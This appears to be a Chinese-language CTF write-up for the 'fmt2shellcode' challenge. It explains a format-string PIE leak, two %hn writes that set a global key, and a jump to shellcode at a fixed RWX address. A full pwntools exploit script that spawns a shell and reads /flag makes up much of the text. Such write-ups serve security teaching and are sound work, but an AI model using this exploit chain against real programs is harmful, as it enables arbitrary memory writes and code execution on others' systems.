# fmt2shellcode

## 题目简述

PIE 程序循环执行 `printf(user_input)`，直到输入 `stop`。只有全局变量 `key` 等于 `0x01919810` 时，程序才会向固定 RWX 地址 `0x114514000` 读取 `0x50` 字节并跳转执行。利用格式化字符串先泄露 PIE，再用两次 `%hn` 写好 `key`，最后发送 shellcode。

## 解题过程

静态分析得到：

```text
_start offset = 0x1140
key offset    = 0x4068
RWX address   = 0x114514000
required key  = 0x01919810
```

第一次用 `%9$p` 泄露运行时 `_start`，计算：

$$
\text{PIE base}=\text{leak}-0x1140
$$

然后：

$$
\text{key address}=\text{PIE base}+0x4068
$$

目标 32 位值拆为两个 16 位半字：低半字 `0x9810 = 38928`，高半字 `0x0191 = 401`。每次 `printf` 的输出计数都会重新从零开始，因此分别使用 `%38928c%8$hn` 和 `%401c%8$hn` 写入 `key` 与 `key+2`。

```python
from pwn import asm, context, p64, remote, shellcraft

context(arch="amd64", os="linux")
io = remote("HOST", PORT)

# 1. 泄露 PIE
io.sendafter(b"something:", b"AAAABBBB%9$pEND\x00")
io.recvuntil(b"BBBB")
start_address = int(io.recvuntil(b"END", drop=True), 16)
pie_base = start_address - 0x1140
key_address = pie_base + 0x4068


def write_half(value, address):
    payload = f"%{value}c%8$hn".encode()
    payload = payload.ljust(0x10, b"A") + p64(address)
    assert len(payload) <= 0x20
    io.sendafter(b"something:", payload)


# 2. 分两次写入 0x01919810
write_half(0x9810, key_address)
write_half(0x0191, key_address + 2)

# 3. 退出格式化字符串循环
io.sendafter(b"something:", b"stop\x00")

# 4. 程序只读取 0x50 字节，shellcode 必须控制在该长度内
shellcode = asm(shellcraft.sh())
assert len(shellcode) <= 0x50
io.sendafter(b"do what you say!\n", shellcode)

io.sendline(b"cat /flag")
io.interactive()
```

附件未保存比赛环境 `/flag` 的具体内容，最终字符串以当前实例 shell 中的输出为准。

## 方法总结

利用链分为三步：格式化字符串泄露 PIE、`%hn` 分段任意写、固定 RWX 区执行 shellcode。分段写能避免一次性打印极大的字符数；每次请求独立计数，因此低、高半字可以分别按目标值直接写入。
